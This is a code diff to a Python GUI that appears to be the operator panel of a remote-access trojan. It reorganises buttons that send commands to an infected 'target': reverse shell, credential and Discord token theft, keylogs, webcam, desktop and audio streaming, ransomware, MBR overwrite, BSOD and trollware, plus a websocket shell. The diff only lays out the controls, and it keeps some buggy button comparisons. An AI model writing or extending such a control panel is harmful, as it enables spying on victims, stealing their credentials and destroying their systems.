@@ -71,118 +71,138 @@ class Controller(customtkinter.CTkFrame):
 
         self.master = master
 
-        for i in range(7): # Set 6 rows
+        for i in range(8): # Set 8 rows
             self.rowconfigure(i, weight= 1)
         
         for i in range(4): # Set 4 columns
             self.columnconfigure(i, weight= 1)
 
-        options = [
-            "Reverse Shell", "Run PY script", "Resend Credentials", 
-            "Nuke Discord Tokens", "Update Discord Webhook", "Stream Camera", 
-            "Stream Desktop","Stream Audio", "Restart Pc", 
-            "Start Ransomware", "Start Trollware", "Stop Trollware", 
-            "Start BSOD", "Overwrite MBR", "Show Message Box",
-            "Shutdown Pc", "Logged Tokens", "Logged Keystrokes", 
-            "Uninstall Client"
-        ]
-
-        commands = [
-            None, None, "sendCreds", 
-            "nukeTokens", None, "streamCamera", 
-            "streamDesktop", "streamAudio", "restart", 
-            "startRansomware", "Troll", "stopTroll",
-            "bsod", "mbr", None, 
-            "shutdown", None, None, 
-            "clean"
-        ]
-
         btn = customtkinter.CTkButton(self, text="X", fg_color="Red", command=lambda: self.destroy())
         btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")
 
-        for count, (command, button_name) in enumerate(zip(commands, options)):
+        frames = {
+            "PC Management": [
+                (None, 'Reverse Shell'),
+                ('bsod', 'Start BSOD'),
+                ('mbr', 'Overwrite MBR'),
+                ('restart', 'Restart Pc'),
+                ('shutdown', 'Shutdown Pc'),
+            ],
+            "Credentials": [
+                ('sendCreds', 'Resend Credentials'),
+                (None, 'Logged Tokens'),
+                (None, 'Logged Keystrokes'),
+                ('nukeTokens', 'Nuke Discord Tokens'),
+                (None, 'Update Discord Webhook'),
+            ], 
+            "Streaming": [
+                ('streamCamera', 'Stream Camera'),
+                ('streamDesktop', 'Stream Desktop'),
+                ('streamAudio', 'Stream Audio'),
+            ],
+            "Misc": [
+                ('startRansomware', 'Start Ransomware'),
+                (None, 'Show Message Box'),
+                ('Troll', 'Start Trollware'),
+                ('stopTroll', 'Stop Trollware'),
+                (None, 'Run PY script'), 
+                ('clean', 'Uninstall Client')
+            ]
+        }
 
-            row = (count // 4) + 1
-            column = count % 4
-            columnspan = 1
+        for count, (title, button_configs) in enumerate(frames.items()):
 
-            if button_name == "Reverse Shell":
-                btn = customtkinter.CTkButton(
-                    self, text=button_name, 
-                    command=lambda: Shell(master, target), 
-                    fg_color="#018f8f",
-                    text_color="white"
-                )
+            frame = customtkinter.CTkFrame(self)
+            frame.grid(row=1, column=count, rowspan=7, padx=20, pady=20, sticky="nsew")
 
-            elif button_name == "Run Py script":
-                btn = customtkinter.CTkButton(
-                    self, text=button_name, 
-                    command=lambda command=command: self.send_command(command, target, True), 
-                    fg_color="#018f8f",
-                    text_color="white"
-                )
+            for i in range(6): # Set 6 rows
+                frame.rowconfigure(i, weight= 1)
+        
+            for i in range(1): # Set 1 column
+                frame.columnconfigure(i, weight= 1)
 
-            elif button_name == "Update Discord Webhook":
-                btn = customtkinter.CTkButton(
-                    self, text=button_name, 
-                    command=lambda: self.get_webhook_input("Enter your new Webhook", target), 
-                    fg_color="#018f8f",
-                    text_color="white"
-                )
+            label = customtkinter.CTkLabel(frame, text=title)
+            label.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")
 
-            elif count == "Show Message Box":
-                btn = customtkinter.CTkButton(
-                    self, text=button_name, 
-                    command=lambda: self.get_message_box(target), 
-                    fg_color="#018f8f",
-                    text_color="white"
-                )
+            for count, (command, button_name) in enumerate(button_configs):
 
-            elif count == "Logged Tokens":
-                btn = customtkinter.CTkButton(
-                    self, text=button_name, 
-                    command=self.download_tokens, 
-                    fg_color="#018f8f",
-                    text_color="white"
-                )
+                if button_name == "Reverse Shell":
+                    btn = customtkinter.CTkButton(
+                        frame, text=button_name, 
+                        command=lambda: Shell(master, target), 
+                        fg_color="#018f8f",
+                        text_color="white"
+                    )
 
-            elif count == "Logged Keystrokes":
-                btn = customtkinter.CTkButton(
-                    self, text=button_name, 
-                    command=self.download_keylogs, 
-                    fg_color="#018f8f",
-                    text_color="white"
-                )
+                elif button_name == "Run Py script":
+                    btn = customtkinter.CTkButton(
+                        frame, text=button_name, 
+                        command=lambda command=command: self.send_command(command, target, True), 
+                        fg_color="#018f8f",
+                        text_color="white"
+                    )
 
-            elif command == "streamCamera":
-                btn = customtkinter.CTkButton(
-                    self, text=button_name, 
-                    command=lambda command=command: (self.send_command(command, target), Video(master, target, 0)), 
-                    fg_color="#018f8f",
-                    text_color="white"
-                )
+                elif button_name == "Update Discord Webhook":
+                    btn = customtkinter.CTkButton(
+                        frame, text=button_name, 
+                        command=lambda: self.get_webhook_input("Enter your new Webhook", target), 
+                        fg_color="#018f8f",
+                        text_color="white"
+                    )
 
-            elif command == "streamDesktop":
-                btn = customtkinter.CTkButton(
-                    self, text=button_name, 
-                    command=lambda command=command: (self.send_command(command, target), Video(master, target, 1)), 
-                    fg_color="#018f8f",
-                    text_color="white"
-                )
+                elif count == "Show Message Box":
+                    btn = customtkinter.CTkButton(
+                        frame, text=button_name, 
+                        command=lambda: self.get_message_box(target), 
+                        fg_color="#018f8f",
+                        text_color="white"
+                    )
 
-            elif command == "streamAudio":
-                btn = customtkinter.CTkButton(
-                    self, text=button_name, 
-                    command=lambda command=command: (self.send_command(command, target), Audio(master, target)), 
-                    fg_color="#018f8f",
-                    text_color="white"
-                )
+                elif count == "Logged Tokens":
+                    btn = customtkinter.CTkButton(
+                        frame, text=button_name, 
+                        command=self.download_tokens, 
+                        fg_color="#018f8f",
+                        text_color="white"
+                    )
 
-            else:
-                btn = customtkinter.CTkButton(self, text=button_name, command=lambda command = command: self.send_command(command, target), fg_color="#018f8f",
-                    text_color="white")
+                elif count == "Logged Keystrokes":
+                    btn = customtkinter.CTkButton(
+                        frame, text=button_name, 
+                        command=self.download_keylogs, 
+                        fg_color="#018f8f",
+                        text_color="white"
+                    )
 
-            btn.grid(row=row, column=column, columnspan=columnspan, padx=5, pady=5, sticky="ew")
+                elif command == "streamCamera":
+                    btn = customtkinter.CTkButton(
+                        frame, text=button_name, 
+                        command=lambda command=command: (self.send_command(command, target), Video(master, target, 0)), 
+                        fg_color="#018f8f",
+                        text_color="white"
+                    )
+
+                elif command == "streamDesktop":
+                    btn = customtkinter.CTkButton(
+                        frame, text=button_name, 
+                        command=lambda command=command: (self.send_command(command, target), Video(master, target, 1)), 
+                        fg_color="#018f8f",
+                        text_color="white"
+                    )
+
+                elif command == "streamAudio":
+                    btn = customtkinter.CTkButton(
+                        frame, text=button_name, 
+                        command=lambda command=command: (self.send_command(command, target), Audio(master, target)), 
+                        fg_color="#018f8f",
+                        text_color="white"
+                    )
+
+                else:
+                    btn = customtkinter.CTkButton(frame, text=button_name, command=lambda command = command: self.send_command(command, target), fg_color="#018f8f",
+                        text_color="white")
+
+                btn.grid(row=count + 1, column=0, padx=20, pady=5, sticky="ew")
 
     def send_message_box(self, frame, title, message, target):
         messagebox = self.messagebox
@@ -484,7 +504,7 @@ class Shell(customtkinter.CTkFrame):
         for i in range(11): # Set 11 rows
             terminal_frame.rowconfigure(i, weight= 1)
         
-        for i in range(100): # Set 11 columns
+        for i in range(100): # Set 100 columns
             terminal_frame.columnconfigure(i, weight= 1)
 
     def kill_proc(self):
@@ -505,7 +525,7 @@ class Shell(customtkinter.CTkFrame):
             try:
                 ws.send(command)
                 break
-            except Exception as e:
+            except websocket.WebSocketException:
                 ws = self.connect()
 
         terminal = customtkinter.CTkLabel(self.terminal_frame, text=command, justify=LEFT, anchor="w")
